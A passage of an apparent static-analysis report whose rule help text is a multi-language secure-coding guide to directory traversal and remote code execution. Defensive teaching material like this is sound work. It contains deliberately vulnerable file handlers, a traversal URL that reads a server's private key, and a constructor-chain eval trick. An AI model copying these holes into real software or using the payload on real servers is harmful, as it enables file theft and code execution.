http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  server.ListenAndServe()\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## Directory Traversal in PHP\n\nAllowing direct file references through user inputs can expose your application to Directory Traversal attacks. Consider this PHP script that fetches restaurant menus:\n\n```php\n$menuDirectory = \"/var/etc/menus\";\n$fileName = $_GET['menu'];\n\nheader(\"Content-Type: application/pdf\");\nheader(\"Content-Disposition: attachment; filename={$fileName}\");\n\n$file = $menuDirectory . DIRECTORY_SEPARATOR . $fileName;\nreadfile($file);\n```\n\nHere, the menu's filename is directly taken from the query string parameter. An attacker can manipulate this parameter, using patterns like `../`, to navigate out of the intended directory and access unintended files.\n\n## Mitigation\n\n1. **Input Sanitization**: Drop any directory references within filenames\n   received from the outside:\n\n```php\n$fileName = basename($_GET['menu']);\n```\n\n2. **Opaque File References**: Instead of direct file references, consider using an array or database of approved filenames, or encode actual file references, ensuring users can't directly specify paths. \n\n:::\n\n::::\n\n## Other Considerations\n\nIf your website is handling a lot of static documents, consider using or integrating a third-party *Content Management\nSystem* (CMS). These will generate secure paths for documents as they are uploaded and allow fine-grained permissions\nto be set.\n\n## Additional information\n\n**[CWE-22](https://cwe.mitre.org/data/definitions/22.html)**\n\n**[OWASP-A5](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)**",
                                "text": "HTTP input data is used as part of a file path to read a file on the server without escaping or validation. This indicates a directory traversal vulnerability.\n\n# Directory Traversal\n\n**Directory traversal** vulnerabilities allow attackers to access arbitrary files on your server by manipulating HTTP\nparameters to include relative path syntax. It is important that you treat any parameters used to refer to files\nsecurely, or an attacker will be able to read sensitive data from your file system. Even better, avoid direct references\nto filenames altogether and use opaque identifiers and indirection instead.\n\n::::tabs\n\n:::tab[Java]\n\nPassing file paths in URLs is dangerous. Consider the following Java application that hosts menus for a restaurant:\n\n```java\npublic class UnsafeFileDownloadServlet\n{\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Taking the unfiltered filename from the HTTP request is dangerous -\n         * an attacker can use the \"../\" syntax in a filename to climb out of\n         * the intended directory.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String menuDirectory = \"/var/etc/menus\";\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + fileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + fileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `FilenameUtils.getBaseName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```java\nimport org.apache.commons.io.FilenameUtils;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Removing anything except alphanumeric characters (and periods) will\n         * stop access to arbitrary directories.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String safeFileName  = FilenameUtils.getBaseName(fileName);\n        final String menuDirectory = \"/var/etc/menus\";\n\n\tif (\"\".equals(safeFileName) || \".\".equals(safeFileName) || \"..\".equals(safeFileName)) {\n\t    throw new SystemException(\"refusing to read a special directory name\");\n\t}\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + safeFileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + safeFileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nIn Java web applications you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content in a Jetty web-server:\n\n```xml\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n  <Set name=\"contextPath\">/menus</Set>\n  <Set name=\"handler\">\n    <New class=\"org.eclipse.jetty.server.handler.ResourceHandler\">\n      <Set name=\"resourceBase\">/var/etc/menus</Set>\n      <Set name=\"directoriesListed\">false</Set>\n    </New>\n  </Set>\n</Configure>\n\n```\n\n:::\n\n:::tab[C#]\n\n## Directory Traversal in C#\n\nPassing file paths in URLs is dangerous. Consider the following ASP.NET Core controller method that hosts menus for a \nrestaurant:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult UnsafeFileDownload([FromQuery] string menu)\n    {\n        byte[] fileBytes = System.IO.File.ReadAllBytes(\"Static/menus/\" + menu);\n        return File(fileBytes, \"application/pdf\", menu);\n    }\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `Path.GetFileName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult SaferFileDownload([FromQuery] string menu)\n    {\n        string baseName = System.IO.Path.GetFileName(menu);\n        if (baseName != \"\" && baseName != \".\" && baseName != \"..\") {\n            byte[] fileBytes    = System.IO.File.ReadAllBytes(\"Static/menus/\" + baseName);\n\n            return File(fileBytes, \"application/pdf\", menu);\n        } else {\n            return Forbid();\n        }\n    }\n```\n\nIn most web-servers you can have the server take care of this for you. The following snipped shows how to use the \nASP.NET Core Static File Middleware to safely mount the `/Static/Menus` directory as static content:\n\n```csharp\n  // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.\n  public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n  {\n      if (env.IsDevelopment())\n      {\n          app.UseDeveloperExceptionPage();\n          app.UseMigrationsEndPoint();\n      }\n      else\n      {\n          app.UseExceptionHandler(\"/Home/Error\");\n          app.UseHsts();\n      }\n      \n      app.UseHttpsRedirection();\n      \n      // Mount the standard 'wwwroot' directory so files are accessible over HTTP.\n      app.UseStaticFiles();\n      \n      // Mount the local 'static/menus' directory so files are accessible over HTTP under the '/menus' path.\n      app.UseStaticFiles(new StaticFileOptions\n      {\n          FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"Static/Menus\")),\n          RequestPath = \"/menus\"\n      });\n      \n      app.UseRouting();\n\n      app.UseEndpoints(endpoints =>\n      {\n          endpoints.MapControllerRoute(\n              name: \"default\",\n              pattern: \"{controller=Home}/{action=Index}/{id?}\");\n          endpoints.MapRazorPages();\n      });\n   } \n```\n\n:::\n\n:::tab[JavaScript]\n\n## Directory Traversal in JavaScript\n\nPassing file paths in URLs is dangerous. Consider the following Express application that hosts menus for a restaurant:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu?menu=breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu?menu=lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu?menu=dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\nconst path = require('path')\n\napp.get('/menu', (request, response) => {\n\n  /**\n   * Taking the unfiltered filename from the HTTP request is dangerous -\n   * an attacker can use the \"../\" syntax in a filename to climb out of\n   * the intended directory.\n   */\n  const menuPath = path.resolve('menus/', request.query.menu)\n\n  response.download(menuPath)\n})\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```javascript\napp.get('/menu', (request, response) => {\n\n  /**\n   * Removing anything except alphanumeric characters (excluding the extension) will\n   * stop access to arbitrary directories.\n   */\n  const suppliedFilename = request.query.menu\n  const match            = suppliedFilename.match(/([a-z0-9]+)\\.([a-z]+)/i)\n  const scrubbedFileName = match[1] + '.' + match[2]\n\n  const menuPath = 'menus/' + scrubbedFileName\n\n  response.download(menuPath)\n})\n```\n\nIn Express, you can have the server take care of this for you. The following code mounts the `/menus` directory as\nstatic content safely:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu/breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu/lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu/dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\n// Tell Express that the /menu directory contains static files that should be made\n// available to the browser.\napp.use('/menu', express.static('menus'))\n```\n\n:::\n\n:::tab[Python]\n\n## Directory Traversal in Python\n\nPassing file paths in URLs is dangerous. Consider the following Flask application that hosts menus for a restaurant:\n\n```python\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An insecure static file handler that allows directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  static_directory = os.fspath(app.menu_folder)\n\n  # The construction of the path here is incredibly insecure!\n  # If a path contains the \"..%2F\" pattern, it will be treated as\n  # ../ and a hacker can climb out of the static directory.\n  filename = posixpath.join(static_directory, filename)\n\n  return send_file(filename)\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you can avoid it, it's preferable to not rely on user input for file names: just\nuse a unique name generated on the server-side instead. This could e.g. be a\ndatabase primary key, or a unique token generated with `secrets.token_urlsafe(32)`.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths.\nThe easiest way to achieve that is with functions such as `os.path.basename`.\nHowever, that would still let through special file names `.` and `..`, for which\nwe add special treatment:\n\n```python\nimport os.path\n\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An more secure file handler does not allow directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  safe_filename    = os.path.basename(filename)\n  if safe_filename == '..' or safe_filename == '.':\n    raise Exception(\"path traversal\")\n\n  static_directory = os.fspath(app.menu_folder)\n  filename         = os.path.join(static_directory, safe_filename)\n\n  return send_file(filename)\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \nthe `/var/etc/menus` directory as static content using the Flask web-server:\n\n```python\n@app.route('/menus/<path:path>')\ndef download_menu(path):\n    return send_from_directory('/var/etc/menus', path)\n```\n\n:::\n\n:::tab[Scala]\n\n## Directory Traversal in Scala\n\nPassing file paths in URLs is dangerous. Consider the following Scala application that hosts menus for a restaurant:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${menu.get}\"))\n  }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    val safeFilename = menu.get.replaceAll(\"[^a-zA-Z0-9\\\\.]\",\"\")\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${safeFilename}\"))\n  }\n}\n```\n\nIn most web-servers you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content using the `Assets` controller of the Play framework:\n\n```\nGET /menus/*menu controllers.Assets.at(path=\"/var/etc/menus\", menu)\n```\n\n:::\n\n:::tab[Go]\n\n## Directory Traversal in Go\n\nPassing file paths in URLs is dangerous. Consider the following Go application that hosts menus for a restaurant:\n\n```go\n// An insecure static file handler that allows directory traversal attacks.\nfunc MenuFileHandler(response http.ResponseWriter, request *http.Request) {\n  fileName := request.URL.Query().Get(\"menu\")\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response, file)\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `filepath.Base` that strips any potential directory\ncomponents from a path. That only leaves `.`, `/` and `..` as special cases that could lead to unexpected behavior:\n\n```go\n// A more secure file handler does not allow directory traversal attacks.\nfunc MenuFileHandler0(response http.ResponseWriter, request *http.Request) {\n  fileName := filepath.Base(request.URL.Query().Get(\"menu\"))\n  if fileName == \".\" || fileName == \"/\" || fileName == \"..\" {\n    http.Error(response, \"Forbidden\", http.StatusForbidden)\n    return\n  }\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response,\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \na configurable directory as static content using the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  server.ListenAndServe()\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## Directory Traversal in PHP\n\nAllowing direct file references through user inputs can expose your application to Directory Traversal attacks. Consider this PHP script that fetches restaurant menus:\n\n```php\n$menuDirectory = \"/var/etc/menus\";\n$fileName = $_GET['menu'];\n\nheader(\"Content-Type: application/pdf\");\nheader(\"Content-Disposition: attachment; filename={$fileName}\");\n\n$file = $menuDirectory . DIRECTORY_SEPARATOR . $fileName;\nreadfile($file);\n```\n\nHere, the menu's filename is directly taken from the query string parameter. An attacker can manipulate this parameter, using patterns like `../`, to navigate out of the intended directory and access unintended files.\n\n## Mitigation\n\n1. **Input Sanitization**: Drop any directory references within filenames\n   received from the outside:\n\n```php\n$fileName = basename($_GET['menu']);\n```\n\n2. **Opaque File References**: Instead of direct file references, consider using an array or database of approved filenames, or encode actual file references, ensuring users can't directly specify paths. \n\n:::\n\n::::\n\n## Other Considerations\n\nIf your website is handling a lot of static documents, consider using or integrating a third-party *Content Management\nSystem* (CMS). These will generate secure paths for documents as they are uploaded and allow fine-grained permissions\nto be set.\n\n## Additional information\n\n**[CWE-22](https://cwe.mitre.org/data/definitions/22.html)**\n\n**[OWASP-A5](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/107037fa5ce21b223c6e131ef4ff15788ca6e08a2e4165adc607528789c3e5e7",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability."
                            },
                            "help": {
                                "markdown": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security 